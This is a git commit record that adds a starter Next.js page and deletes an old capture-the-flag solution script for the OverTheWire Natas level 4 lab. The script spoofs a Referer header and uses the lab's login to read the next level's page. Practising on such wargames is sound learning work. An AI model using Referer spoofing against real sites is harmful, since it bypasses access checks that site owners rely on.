e46e85e9f49a71c1dddc26c0ff6ef73bdae780b8
divyanshusahu <dsahu1997@gmail.com>
2020-07-02 18:31:07 +0530

    intial setup with nextjs, preact and tailwindcss

---
+++ pages/index.js
@@ -0,0 +1,9 @@
+function Index() {
+  return (
+    <main className="container mx-auto sm:container">
+      <h1>Hello from Divyanshu</h1>
+    </main>
+  )
+}
+
+export default Index;
--- write-ups/natas/files/natas4.py
+++
@@ -1,5 +0,0 @@
-import requests
-target = 'http://natas4.natas.labs.overthewire.org/'
-header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}
-r = requests.get(target, headers=header, auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
-print r.text
